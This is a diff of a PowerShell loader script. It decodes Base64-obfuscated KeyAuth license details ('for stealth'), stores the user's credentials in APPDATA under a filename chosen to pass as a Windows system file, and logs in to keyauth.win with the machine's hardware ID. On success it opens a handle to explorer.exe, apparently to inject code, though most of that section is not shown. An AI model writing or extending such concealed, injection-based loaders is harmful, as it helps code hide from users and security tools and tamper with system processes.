@@ -1,89 +1,75 @@
-# Path to save encrypted credentials - legit Windows folder & filename
-$credFile = "$env:APPDATA\Microsoft\Windows\SystemConfig.xml"
+# Save credentials to a legit-sounding file
+$credPath = "$env:APPDATA\Microsoft\Windows\SystemConfig.xml"
 
-# Create folder if it doesn't exist
-$folder = Split-Path $credFile
-if (-not (Test-Path $folder)) {
-    New-Item -ItemType Directory -Path $folder -Force | Out-Null
+function Decode-Base64($b64) {
+    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
 }
 
-# Base64 encoded API URL for KeyAuth v1.3
-$enc_url = "aHR0cHM6Ly9rZXlhdXRoLndpbi9hcGkvMS4zLw=="
-$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc_url))
+# KeyAuth App Info (Base64 Encoded for stealth)
+$appName = Decode-Base64 "T1JQSFVFUyBNT0RVTEU="      # ORPHUES MODULE
+$ownerID = Decode-Base64 "dnNhRTZSSUhvTA=="          # vsaE6RIHoL
+$appVersion = Decode-Base64 "MS4w"                   # 1.0
+$apiUrl = Decode-Base64 "aHR0cHM6Ly9rZXlhdXRoLndpbi9hcGkvMS4zLw=="  # https://keyauth.win/api/1.3/
 
-# Your KeyAuth credentials encoded in Base64
-$enc_appName = "T1JQSFVFUyBNT0RVTEU="       # ORPHUES MODULE
-$enc_ownerId = "dnNhRTZSSUhvTA=="           # vsaE6RIHoL
-$enc_appVersion = "MS4w"                    # 1.0
+# Retrieve HWID
+$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
 
-function Decode-Base64($encoded) {
-    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
-}
-
-$appName = Decode-Base64 $enc_appName
-$ownerId = Decode-Base64 $enc_ownerId
-$appVersion = Decode-Base64 $enc_appVersion
-
-function Get-Credentials {
-    if (Test-Path $credFile) {
+function Get-Login {
+    if (Test-Path $credPath) {
         try {
-            $cred = Import-Clixml -Path $credFile
-            $username = $cred.UserName
-            $passwordSecure = $cred.Password
-            $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
-            $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
+            $saved = Import-Clixml -Path $credPath
+            $username = $saved.Username
+            $securePass = $saved.Password
+            $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass)
+            $password = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
             [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr)
-            return @{username=$username; password=$passwordPlain}
+            return @{user=$username; pass=$password}
         } catch {
-            Remove-Item $credFile -ErrorAction SilentlyContinue
+            Remove-Item $credPath -ErrorAction SilentlyContinue
         }
     }
 
     $username = Read-Host "Enter Username"
-    $passwordSecure = Read-Host "Enter Password" -AsSecureString
+    $securePass = Read-Host "Enter Password" -AsSecureString
 
-    $credToSave = New-Object -TypeName PSObject -Property @{
-        UserName = $username
-        Password = $passwordSecure
+    $obj = [PSCustomObject]@{
+        Username = $username
+        Password = $securePass
     }
+    $obj | Export-Clixml $credPath
 
-    $credToSave | Export-Clixml -Path $credFile
-
-    $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
-    $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
+    $ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass)
+    $password = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)
     [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr)
 
-    return @{username=$username; password=$passwordPlain}
+    return @{user=$username; pass=$password}
 }
 
-# Get credentials (auto-login or prompt)
-$creds = Get-Credentials
-$username = $creds.username
-$passwordPlain = $creds.password
+# Get credentials (either saved or prompt)
+$login = Get-Login
+$username = $login.user
+$password = $login.pass
 
-# Get HWID
-$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
-
-# Prepare login payload
+# Prepare JSON payload
 $payload = @{
     type     = "login"
     username = $username
-    pass     = $passwordPlain
+    pass     = $password
     hwid     = $hwid
     name     = $appName
-    ownerid  = $ownerId
+    ownerid  = $ownerID
     version  = $appVersion
 } | ConvertTo-Json -Compress
 
-$web = New-Object System.Net.WebClient
-$web.Headers.Add("Content-Type", "application/json")
-
+# Send login request
 try {
-    $responseRaw = $web.UploadString($url, $payload)
-    $response = $responseRaw | ConvertFrom-Json
+    $web = New-Object System.Net.WebClient
+    $web.Headers.Add("Content-Type", "application/json")
+    $response = $web.UploadString($apiUrl, $payload)
+    $json = $response | ConvertFrom-Json
 
-    if ($response.success -eq $true) {
-        Write-Host "Login successful! Welcome $username." -ForegroundColor Green
+    if ($json.success -eq $true) {
+        Write-Host "`n[+] Login Success: $username" -ForegroundColor Green
        
 
 # Find explorer.exe process
@@ -158,11 +144,12 @@ if ($hProc -ne [IntPtr]::Zero) {
 }
 
     } else {
-        Write-Host "Login failed: $($response.message)" -ForegroundColor Red
-        if (Test-Path $credFile) { Remove-Item $credFile -ErrorAction SilentlyContinue }
+        Write-Host "`n[-] Login Failed: $($json.message)" -ForegroundColor Red
+        Remove-Item $credPath -ErrorAction SilentlyContinue
         exit
     }
-} catch {
-    Write-Host "Connection error: $($_.Exception.Message)" -ForegroundColor Yellow
+}
+catch {
+    Write-Host "`n[!] Error: $($_.Exception.Message)" -ForegroundColor Yellow
     exit
 }
